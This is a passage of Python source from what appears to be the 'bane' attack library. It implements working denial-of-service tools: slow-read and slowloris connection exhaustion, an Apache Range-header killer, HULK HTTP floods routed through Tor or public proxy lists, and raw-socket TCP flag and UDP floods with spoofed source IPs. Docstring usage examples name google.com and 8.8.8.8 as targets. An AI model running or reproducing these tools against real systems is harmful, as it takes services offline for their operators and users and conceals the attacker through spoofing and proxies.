       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
      d=s.recv(random.randint(self.rre1,self.rre2))
      if prints==True:
       print("Received: {}".format(d))
      time.sleep(random.randint(self.sre1,self.sre2))
     except:
      break
    s.close()
   except Exception as e:
    pass
def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs=True,settor=False,interval=300):
 '''
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   maxtime: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.slowread('www.google.com',p=443,threads=300,maxtime=7)

'''
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global sre1
 sre1=speed1
 global sre2
 sre2=speed2
 global rre1
 rre1=read1
 global rre2
 rre2=read2
 for x in range(threads):
  t= slrd()
  t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class apa(threading.Thread):
 def run(self):
  global apache_killer_counter
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  self.packs2=packs2
  self.packs1=packs1
  self.speed=speed
  time.sleep(2)
  while (stop!=True):
   try:
    apache="5-0"
    for x in range(1,random.randint(1200,1300)):
     apache+=',5-'+str(x)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target, self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for x in range(random.randint(self.packs2,self.packs1)):
     if stop==True:
      break
     try:
      s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(random.randint(1,1000000))+str(random.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
      apache_killer_counter+=1
      if prints==True:
       print("Requests sent: {}".format(apache_killer_counter))
     except:
      break
     time.sleep(self.speed)
   except:
    pass
class ptc(threading.Thread):
 def run(self):
  global proxslow_counter
  self.target=target
  self.port=port
  self.timeout=timeout
  self.sre1=sre1
  self.sre2=sre2
  self.speed=speed
  time.sleep(2)
  x=pointer
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if z<13:
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if z<13:
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    while (stop!=True):
     pa=random.choice(paths)
     if "?" in pa:
      jo='&'
     else:
      jo='?'
     pa+=jo+str(random.randint(1,1000000000))+'='+str(random.randint(1,1000000000))
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
      if prints==True:
       print("Slow-->{}".format(ipp))
      time.sleep(random.randint(self.sre1,self.sre2))
     except:
      break
    s.close()
   except Exception as e:
    pass
def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
 global proxslow_counter
 proxslow_counter=0
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global sre1
 sre1=speed1
 global sre2
 sre2=speed2
 global rre1
 rre1=read1
 global rre2
 rre2=read2
 for x in range(threads):
  t=ptc()
  t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return proxslow_counter
def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
 '''
   this is a python version of the apache killer tool which was originally written in perl.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 256) number of connections
   maxtime: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.apache_killer('www.google.com',p=80)

'''
 global apache_killer_counter
 apache_killer_counter=0
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  apa().start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return apache_killer_counter
class loris(threading.Thread):
 def run(self):
  global slowloris_counter
  self.target=target
  self.port=port
  self.timeout=timeout
  self.tor=tor
  ls=[]
  if prints==True:
   print("\tBuilding sockets...")
  time.sleep(1)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target, self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    pa=random.choice(paths)
    q=''
    for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
    p=''
    for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
    if '?' in pa:
      jo='&'
    else:
      jo='?' 
    pa+=jo+q+"="+p
    s.send("GET {} HTTP/1.1\r\n".format(pa).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    ls.append(s)
    slowloris_counter+=1
   except Exception as e:
    pass
   for so in list(ls):
    try:
     so.send("X-a: {}\r\n".format(random.randint(1, 1000000)).encode("utf-8"))
    except socket.error as e:
     ls.remove(so)
     slowloris_counter=slowloris_counter-1
     if slowloris_counter<0:
      slowloris_counter=0
   if stop==True:
    break
   if prints==True:
    sys.stdout.write("\r\tSockets alive: {}".format(slowloris_counter))
    sys.stdout.flush()
  for soc in ls:
    try:
     soc.close()
    except:
     pass
  ls=[]
def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
 '''
   this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
   on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 20) number of threads
   maxtime: (set by default to: 5) connection timeout flag 

'''
 global slowloris_counter
 slowloris_counter=0
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=loris()
  t.start()
  time.sleep(.01)
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 print('')
class plor(threading.Thread):
 def run(self):
  #global proxloris_counter
  self.target=target
  self.port=port
  self.timeout=timeout
  time.sleep(2)
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if z<13:
     s.settimeout=(self.timeout)
    s.connect((self.target,self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    pa=random.choice(paths)
    q=''
    for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
    p=''
    for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
    if '?' in pa:
      jo='&'
    else:
      jo='?' 
    pa+=jo+q+"="+p
    s.send("GET {} HTTP/1.1\r\n".format(pa).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    while (stop!=True):
     s.send("X-a: {}\r\n".format(random.randint(1,10000000)).encode("utf-8"))
     time.sleep(speed)
     print("socket-->{}".format(ipp))
   except:
    pass
def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,level=1):
 '''
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  maxtime: (set by default to: 5) the connection timeout flag value
  example:
  >>>import bane
  >>>bane.proxhammer('www.google.com',threads=256)
'''
 global speed
 speed=level
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global socks4list
 if socks4l:
  socks4list=socks4l
 else:
  socks4list=massocks4()
 global socks5list
 if socks5l:
  socks5list=socks5l
 else:
  socks5list=massocks5()
 global stop
 stop=False
 global prints
 prints=logs
 global pointer
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for j in range(threads):
    t=plor()
    t.start()
    time.sleep(.001)
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
class phu(threading.Thread):
 def run(self):
  global proxhulk_counter
  self.target=target
  self.timeout=timeout
  global httplist
  global stop
  time.sleep(2)
  while (stop!=True):
   u=random.choice(paths)
   try:
    q=""
    for x in range(random.randint(2,5)):
     q+=random.choice(lis)+str(random.randint(1,1000000))
    p=""
    for x in range(random.randint(2,5)):
     p+=random.choice(lis)+str(random.randint(1,1000000))
    if '?' in u:
      jo='&'
    else:
      jo='?' 
    u+=jo+q+"="+p
    pr=random.choice(httplist)
    proxy = urllib2.ProxyHandler({ 'http': pr, 'https': pr })
    opener = urllib2.build_opener(proxy) 
    urllib2.install_opener(opener)
    urllib2.urlopen("http://"+self.target+u,timeout=self.timeout)
    if stop==True:
        break
    proxhulk_counter+=1
    if prints==True:
     print("[!]Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
   except Exception as e:
    pass
class hu(threading.Thread):
 def run(self):
  global hulk_counter
  self.target=target
  self.timeout=timeout
  global stop
  time.sleep(2)
  while (stop!=True):
     u=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     s=''
     for i in range(random.randint(2,5)):
      s+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+s
     request = urllib2.Request('http://'+self.target+u)
     request.add_header('User-Agent', random.choice(ua))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept',random.choice(a))
     request.add_header('Accept-Language',random.choice(al))
     request.add_header('Accept-Encoding',random.choice(ec))
     request.add_header('Accept-Charset', random.choice(ac))
     request.add_header('Referer', random.choice(referers) +p)
     request.add_header('Keep-Alive', random.randint(100,500))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host',self.target)
     try:
      urllib2.urlopen(request,timeout=self.timeout)     
      if stop==True:
        break
      hulk_counter+=1
      if prints==True:
       print("Requests: {}".format(hulk_counter))
     except urllib2.HTTPError as ex:
      if stop==True:
        break
      hulk_counter+=1
      if prints==True:
       print("Requests: {}".format(hulk_counter))
     except Exception as e:
      pass
def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=False):
 '''
   this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
    
   it takes the following parameters:

   u: target domain
   threads: (set by default to: 700) number of connections
   maxtime: (set by default to: 10) connection timeout flag

   example:

   >>>import bane
   >>>bane.hulk('www.google.com',threads=1000)

'''
 global hulk_counter
 hulk_counter=0
 if settor==True:
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
  socket.socket = socks.socksocket
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global timeout
 timeout=maxtime
 for x in range(threads):
  t= hu()
  t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return hulk_counter
def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returning=False):
 '''

   it takes the following parameters:

   u: target domain
   httpl: (set by default to: None) custom http proxies list
   threads: (set by default to: 700) number of connections
   maxtime: (set by default to: 10) connection timeout flag 

   example:

   >>>import bane
   >>>bane.proxhulk('www.google.com',threads=700,httpl=your_http_proxies_list['ip:port','ip:port'])

   >>>bane.proxhulk('www.google.com')

'''
 global proxhulk_counter
 proxhulk_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global timeout
 timeout=maxtime
 for x in range(threads):
   t=phu()
   t.start()
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
  return proxhulk_counter
def checksum(msg):
 '''
   this function is used for the SYN flood checksum.

   it takes an input and returns it checksum.

'''
 s = 0
 for i in range(0, len(msg), 2):
   if i+1==len(msg):
     w = ord(msg[i])
     s += w
   else:
    w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
    s += w
 s = (s>>16) + (s & 0xffff);
 s = s + (s >> 16);
 s = ~s & 0xffff
 return s
class sflood(threading.Thread): 
 def run(self):
  global synflood_counter
  self.minsize=minsize
  self.maxsize=maxsize
  self.speed=speed
  self.target=target
  dip=self.target
  self.port=port
  self.synf=synf
  self.rstf=rstf
  self.pshf=pshf
  self.ackf=ackf
  self.urgf=urgf
  self.finf=finf
  self.winds=winds
  self.paylo=paylo
  self.min_win=min_win
  self.max_win=max_win
  self.ip_seg=ip_seg
  self.maxttl=maxttl
  self.minttl=minttl
  self.s_port=s_port
  self.min_por=min_por
  self.max_por=max_por
  time.sleep(2)
  while (stop!=True):
   try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    if self.s_port<0:
     sp=random.randint(self.min_por,self.max_por)
    else:
     sp=self.s_port
    if self.paylo==0:
     urd=''
     req='None'
    elif self.paylo==1:
      urd=''
      req='TCP'
      for x in range(random.randint(self.minsize,self.maxsize)):
       urd+=random.choice(lis)
      if len(urd)>1400:
       urd=urd[0:1400]
    elif self.paylo==2:
      pths=random.choice(paths)
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
          df=random.choice(ec)
          if df!=ed:
           gy+=1
        ed+=', '
        ed+=df
       l=random.choice(al)
       for n in range(random.randint(0,5)):
        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
       kl=random.randint(1,2)
       if kl==1:
        req="GET"
        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),self.target)
       else:
        req="POST"
        k=''
        for _ in range(1,random.randint(2,5)):
         k+=random.choice(lis)
        k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        for _ in range(1,random.randint(1,3)):
         k+=random.choice(lis)
        j=''
        for x in range(0,random.randint(11,31)):
         j+=random.choice(lis)
        par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
    leng=len(urd)
    urd=urd.encode('utf-8')
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    ips = socket.inet_aton(sip)
    ipd = socket.inet_aton(dip)
    iphv = (4 << 4) + 5
    iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(self.minttl,self.maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
    tcr = (5 << 4) + 0
    tf = self.finf + (self.synf << 1) + (self.rstf << 2) + (self.pshf <<3) + (self.ackf << 4) + (self.urgf << 5)
    if self.winds==0:
     windf=0
    elif self.winds<0:
     windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
    else:
     windf=self.winds
    thd = pack('!HHLLBBHHH' , sp, self.port, 0 , self.ackf, 5, tf, socket.htons(windf) , 0, 0)
    source_address = socket.inet_aton( sip ) 
    dest_address = socket.inet_aton(dip) 
    tcl = len(thd) + leng 
    psh = pack('!4s4sBBH' , source_address , dest_address , 0, socket.IPPROTO_TCP , tcl); 
    psh = psh + thd + urd; 
    tk = checksum(str(psh))
    tcp_header = pack('!HHLLBBH',sp, port, 0, ackf, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',0)
    packet = iph + tcp_header + urd
    s.sendto(packet, (dip,self.port))
    synflood_counter+=1
    if prints==True:
     print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
   except Exception as e:
    pass
   time.sleep(self.speed)
def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,min_ttl=64,max_ttl=64,interval=300,logs=True,returning=False):
  '''
   this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).

   it takes the following paramters:

   u: target IP
   p: (set by default to: 80) target port
   threads: (set by default to: 100)
   syn: (set by default to: 1) syn flag value
   ack,psh,rst,urg,fin: (set by default to: 0) the other TCP flags values
   tcp: (set by default to: False) set to True to send random strings instead of http requests
   window: (set by default to: "random" for random values between 0 and 65535) tcp window size, set to "null" if you want 0 window size
   payloads: (set by default to: True) set to False to send no extra data
   low,maxi: (set by default to: 64) maximum and minimum TTL values
   ampli: (set by default to:15) multiplication of the TCP strings' size

   example:

   #to launch a syn flood
   >>>bane.synflood('8.8.8.8')

   #to launch ack flood
   >>>bane.synflood('8.8.8.8',syn=0,ack=1)

'''
  global minsize
  minsize=min_size
  global maxsize
  maxsize=max_size
  global speed
  if level<=1:
   speed=0.1
  elif level==2:
   speed=0.05
  elif level==3:
   speed=0.01
  elif level==4:
   speed=0.005
  elif level>=5:
   speed=0.001
  if limiting==False:
   speed=0
  global synflood_counter
  synflood_counter=0
  global stop
  stop=False
  global s_port
  s_port=source_port
  global min_por
  min_por=min_port
  global max_por
  max_por=max_port
  global ip_seg
  ip_seg=ip_range
  global max_win
  max_win=max_window
  if max_win>256:
   max_win=256
  global min_win
  min_win=min_window
  if min_win<0:
   min_win=0
  global prints
  prints=logs
  global target
  target=u
  global port
  port=p
  global synf
  synf=syn
  global rstf
  rstf=rst
  global pshf
  pshf=psh
  global ackf
  ackf=ack
  global urgf
  urgf=urg
  global finf
  finf=fin
  global winds
  winds=window
  global paylo
  paylo=int(payload)
  if paylo<0:
   paylo=0
  if paylo>2:
   paylo=2
  global maxttl
  maxttl=max_ttl
  global minttl
  minttl=min_ttl
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error as msg:
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
    t= sflood()
    t.start()
   c=time.time()
   while True:
    if stop==True:
     break
    try:
     time.sleep(.1)
     if int(time.time()-c)==interval:
      stop=True
      break
    except KeyboardInterrupt:
     stop=True
     break
   if returning==True:
    return synflood_counter  
class udpsp(threading.Thread):
 def run(self):
  global udpstorm_counter
  self.speed=speed
  self.target=target
  self.port=port
  self.maxttl=maxttl
  self.minttl=minttl
  self.minsize=minsize
  self.maxsize=maxsize
  self.ip_seg=ip_seg
  self.s_port=s_port
  self.min_por=min_por
  self.max_por=max_por
  time.sleep(2)
  while (stop!=True):
   try:
    if self.s_port<0:
     sp=random.randint(self.min_por,self.max_por)
    else:
     sp=self.s_port
    msg=''
    for x in range(random.randint(self.minsize,self.maxsize)):
     msg+=random.choice(lis)
    if len(msg)>1400:
     msg=msg[0:1400]
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=sip, dst=self.target)/UDP(sport=sp,dport=self.port)/msg
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    udpstorm_counter+=1
    if prints==True:
     print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
   except:
    pass
   time.sleep(self.speed)
def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,interval=300,logs=True,returning=False):
 '''
   this function is for UDP flood attack using spoofed sources
'''
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 global udpstorm_counter
 udpstorm_counter=0
 global stop
 stop=False
 global s_port
 s_port=source_port
 global min_por
 min_por=min_port
 global max_por
 max_por=max_port
 global ip_seg
 ip_seg=ip_range
 global prints
 prints=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   udpsp().start()
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==interval:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if returning==True:
    return udpstorm_counter
class ln(threading.Thread):
 def run(self):
  global land_counter
  self.minsize=minsize
  self.maxsize=maxsize
  self.speed=speed
  self.target=target
  self.port=port
  self.maxttl=maxttl
  self.minttl=minttl
  self.winds=winds
  self.min_win=min_win
  self.max_win=max_win
  self.paylo=paylo
  time.sleep(2)
  while (stop!=True):
   try:
    if self.winds==0:
     windf=0
    elif self.winds<0:
     windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
    else:
     windf=self.winds
    if self.paylo==0:
     urd=''
     req='None'
    elif self.paylo==1:
      urd=''
      req='TCP'
      for x in range(random.randint(self.minsize,self.maxsize)):
       urd+=random.choice(lis)
      if len(urd)>1400:
       urd=urd[0:1400]
    elif self.paylo==2:
      pths=random.choice(paths)
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
          df=random.choice(ec)
          if df!=ed:
           gy+=1
        ed+=', '
        ed+=df
       l=random.choice(al)
       for n in range(random.randint(0,5)):
        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
       kl=random.randint(1,2)
       if kl==1:
        req="GET"
        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),self.target)
       else:
        req="POST"
        k=''
        for _ in range(1,random.randint(2,5)):
         k+=random.choice(lis)
